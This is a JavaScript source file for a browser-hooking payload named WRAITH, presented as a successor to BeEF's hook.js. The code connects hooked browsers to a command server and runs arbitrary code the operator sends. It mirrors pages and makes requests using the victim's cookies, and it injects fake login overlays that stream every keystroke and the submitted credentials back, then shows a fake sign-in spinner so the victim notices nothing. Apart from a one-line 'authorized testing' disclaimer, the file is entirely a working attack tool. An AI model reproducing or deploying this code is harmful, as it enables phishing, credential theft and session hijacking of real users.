/* WRAITH hook payload --------------------------------------------------
 * The modern, reliable equivalent of BeEF's hook.js.
 *
 * Embed it in any page you control:  <script src="/hook.js"></script>
 *
 * What it does:
 *   1. Figures out where it was loaded from and opens a WebSocket back there.
 *      (So the same file works on localhost AND on a remote server with no edits.)
 *   2. Fingerprints the browser and registers, so it shows up in the panel.
 *   3. Waits for "deploy" commands and renders the chosen overlay inside a
 *      shadow DOM -- isolated from the host page's CSS so the fake
 *      login looks identical no matter what site it is dropped on.
 *   4. Streams every keystroke and the final submitted credentials back up.
 *
 * FOR AUTHORIZED SECURITY TESTING, RESEARCH & EDUCATION ONLY.
 * --------------------------------------------------------------------- */
(function () {
  'use strict';
  if (window.__wraith__) return;          // never hook twice
  window.__wraith__ = true;

  // --- find our own origin -> derive the C2 WebSocket URL ----------------
  function selfSrc() {
    if (document.currentScript && document.currentScript.src) return document.currentScript.src;
    var s = document.querySelector('script[src*="hook.js"]');
    return s ? s.src : location.href;
  }
  var origin;
  try { origin = new URL(selfSrc(), location.href).origin; } catch (e) { origin = location.origin; }
  var WS_URL = origin.replace(/^http/, 'ws') + '/ws/hook';

  // --- light browser/OS fingerprint --------------------------------------
  function fingerprint() {
    var ua = navigator.userAgent;
    var browser = 'Unknown';
    if (/Edg\//.test(ua)) browser = 'Edge';
    else if (/OPR\//.test(ua)) browser = 'Opera';
    else if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) browser = 'Chrome';
    else if (/Firefox\//.test(ua)) browser = 'Firefox';
    else if (/Safari\//.test(ua) && /Version\//.test(ua)) browser = 'Safari';
    var os = 'Unknown';
    if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
    else if (/Windows/.test(ua)) os = 'Windows';
    else if (/Mac OS X/.test(ua)) os = 'macOS';
    else if (/Android/.test(ua)) os = 'Android';
    else if (/iPhone|iPad/.test(ua)) os = 'iOS';
    else if (/Linux/.test(ua)) os = 'Linux';
    return {
      browser: browser, os: os, ua: ua,
      lang: navigator.language,
      screen: screen.width + 'x' + screen.height,
      page: location.href, title: document.title, referrer: document.referrer,
      origin: location.origin,
      cookies: (document.cookie ? document.cookie.split(';').filter(Boolean).length : 0)
    };
  }

  // --- connection w/ auto-reconnect --------------------------------------
  var ws = null, myId = null, backoff = 1000, activeModule = null;

  function connect() {
    try { ws = new WebSocket(WS_URL); } catch (e) { return retry(); }
    ws.onopen = function () {
      backoff = 1000;
      sendUp({ type: 'register', fp: fingerprint() });
    };
    ws.onmessage = function (ev) {
      var msg; try { msg = JSON.parse(ev.data); } catch (e) { return; }
      if (msg.type === 'registered') myId = msg.id;
      else if (msg.type === 'deploy') deploy(msg);
      else if (msg.type === 'recall') { teardown(); taskAbort = true; }
      else if (msg.type === 'task') runTask(msg);
      else if (msg.type === 'mirror-dom') mirrorDom(msg);
      else if (msg.type === 'mirror-fetch') mirrorFetch(msg);
    };
    ws.onclose = retry;
    ws.onerror = function () { try { ws.close(); } catch (e) {} };
  }
  function retry() {
    setTimeout(connect, backoff);
    backoff = Math.min(backoff * 1.7, 15000);
  }
  function sendUp(obj) {
    if (ws && ws.readyState === 1) ws.send(JSON.stringify(obj));
  }

  // --- background tasks (non-overlay modules, e.g. portscan) -------------
  var taskAbort = false;

  function runTask(msg) {
    taskAbort = false;
    var api = {
      report: function (r) { sendUp({ type: 'task-result', task: msg.taskId, result: r }); },
      done: function (s) { sendUp({ type: 'task-done', task: msg.taskId, summary: s || null }); },
      aborted: function () { return taskAbort; }
    };
    try { new Function('params', 'wraith', msg.script)(msg.params || {}, api); }
    catch (e) { sendUp({ type: 'task-done', task: msg.taskId, summary: { error: String(e) } }); }
  }

  // --- page mirror -------------------------------------------------------
  // Let an operator browse the victim's origin from inside their session: send
  // back the live DOM, or fetch a same-origin URL (carrying the victim's cookies)
  // and return its HTML. Cross-origin reads fail by design (Same-Origin Policy).
  var MIRROR_CAP = 3000000;
  function clip(s) { s = s || ''; return s.length > MIRROR_CAP ? s.slice(0, MIRROR_CAP) : s; }

  function mirrorDom(msg) {
    var html = '';
    try { html = document.documentElement.outerHTML || ''; } catch (e) {}
    sendUp({ type: 'mirror-page', reqId: msg.reqId, url: location.href,
             finalUrl: location.href, status: 200, live: true, html: clip(html) });
  }
  function mirrorFetch(msg) {
    try {
      fetch(msg.url, { credentials: 'include' }).then(function (r) {
        return r.text().then(function (t) {
          sendUp({ type: 'mirror-page', reqId: msg.reqId, url: msg.url,
                   finalUrl: r.url || msg.url, status: r.status, html: clip(t) });
        });
      }).catch(function (e) {
        sendUp({ type: 'mirror-page', reqId: msg.reqId, url: msg.url, error: String(e) });
      });
    } catch (e) {
      sendUp({ type: 'mirror-page', reqId: msg.reqId, url: msg.url, error: String(e) });
    }
  }

  // --- overlay rendering (the "module" side) -----------------------------
  var hostEl = null;
  var prevBodyFilter = '';      // restored on teardown
  var prevBodyTransition = '';

  function teardown() {
    if (hostEl && hostEl.parentNode) hostEl.parentNode.removeChild(hostEl);
    hostEl = null; activeModule = null;
    document.documentElement.style.overflow = '';
    // un-blur the page behind us
    if (document.body) {
      document.body.style.filter = prevBodyFilter;
      document.body.style.transition = prevBodyTransition;
    }
  }

  function deploy(msg) {
    teardown();
    activeModule = msg.moduleId;

    // Host node pinned over everything; closed shadow root isolates our CSS.
    hostEl = document.createElement('div');
    hostEl.setAttribute('data-wraith', '');
    hostEl.style.cssText =
      'all:initial;position:fixed;inset:0;z-index:2147483647;';
    document.documentElement.appendChild(hostEl);
    document.documentElement.style.overflow = 'hidden';

    // Blur the background app. The overlay lives on <html>, the page lives in
    // <body>, so blurring <body> frosts everything behind the dialog while the
    // dialog itself stays razor sharp.
    if (document.body) {
      prevBodyFilter = document.body.style.filter || '';
      prevBodyTransition = document.body.style.transition || '';
      document.body.style.transition = 'filter .18s ease';
      // next frame so the transition actually animates in
      requestAnimationFrame(function () {
        if (document.body) document.body.style.filter = 'blur(7px)';
      });
    }

    var root = hostEl.attachShadow ? hostEl.attachShadow({ mode: 'open' }) : hostEl;

    // Backdrop + module markup, all inside the shadow root.
    var style = document.createElement('style');
    style.textContent =
      ':host,*{box-sizing:border-box}' +
      '.wr-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.42);' +
      'display:flex;align-items:center;justify-content:center;padding:20px;' +
      'overflow:auto;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}' +
      msg.css;
    root.appendChild(style);

    var wrap = document.createElement('div');
    wrap.className = 'wr-backdrop';
    wrap.innerHTML = msg.html;
    root.appendChild(wrap);

    wireCapture(root);

    // Let the module run its own logic (e.g. Microsoft's 2-step flow).
    if (msg.script) {
      try { new Function('root', 'wraith', msg.script)(root, { teardown: teardown }); }
      catch (e) { /* keep silent in front of a "victim" */ }
    }
  }

  // Generic capture wiring shared by every module:
  //   - any <input>/<textarea> streams its value on each keystroke
  //   - any [data-wr-submit] gathers all named fields and reports them
  function wireCapture(root) {
    var inputs = root.querySelectorAll('input, textarea');
    inputs.forEach(function (el) {
      var field = el.name || el.getAttribute('data-wr-field') || el.type || 'field';
      el.addEventListener('input', function () {
        if (el.type === 'password' || el.type === 'text' || el.type === 'email' ||
            el.type === 'tel' || el.tagName === 'TEXTAREA') {
          sendUp({ type: 'keystroke', module: activeModule, field: field, value: el.value });
        }
      });
    });

    root.querySelectorAll('[data-wr-submit]').forEach(function (btn) {
      btn.addEventListener('click', function (e) {
        e.preventDefault();
        submitCapture(root, btn.getAttribute('data-wr-redirect') || '');
      });
    });

    // Also catch real <form> submits inside the overlay.
    root.querySelectorAll('form').forEach(function (f) {
      f.addEventListener('submit', function (e) {
        e.preventDefault();
        submitCapture(root, '');
      });
    });
  }

  function submitCapture(root, redirect) {
    var data = {};
    root.querySelectorAll('input, textarea').forEach(function (el) {
      var field = el.name || el.getAttribute('data-wr-field');
      if (field && el.type !== 'submit' && el.type !== 'button') data[field] = el.value;
    });
    sendUp({ type: 'capture', module: activeModule, data: data });

    // Sell it: brief "signing in..." spinner, then dismiss (or bounce to the
    // real site so the user assumes a hiccup). Teaching-grade, not evasion.
    var card = root.querySelector('[data-wr-card]');
    if (card) card.innerHTML =
      '<div style="padding:48px;text-align:center;font-family:inherit;color:#555">' +
      '<div class="wr-spin" style="width:34px;height:34px;border:3px solid #ddd;' +
      'border-top-color:#888;border-radius:50%;margin:0 auto 16px;animation:wrspin 1s linear infinite"></div>' +
      'Signing in&hellip;</div>' +
      '<style>@keyframes wrspin{to{transform:rotate(360deg)}}</style>';

    setTimeout(function () {
      teardown();
      if (redirect) { try { location.href = redirect; } catch (e) {} }
    }, 1400);
  }

  connect();
})();
